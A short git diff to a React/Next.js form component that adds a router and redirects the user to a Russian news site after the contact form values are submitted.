@@ -2,6 +2,7 @@
 import { useEffect, useState } from "react";
 import { sendContactForm } from "../lib/api";
 import styles from "../styles/styles.module.css";
+import { useRouter } from 'next/navigation';
 const initialValues = {
   email: "",
   message: "",
@@ -13,6 +14,8 @@ const LoginForm = () => {
   const [state, setState] = useState(initialState);
   const [showSelect, setShowSelect] = useState(true)
   const [isActiveTwo, setIsActiveTwo] = useState(false);
+
+  const navigate = useRouter()
 
   const { values } = state;
 
@@ -32,6 +35,9 @@ const LoginForm = () => {
       ...prev,
     }));
     await sendContactForm(values);
+
+    navigate.push('https://news.mail.ru')
+    
   };
 
   const changeInputHandler = (e) => {
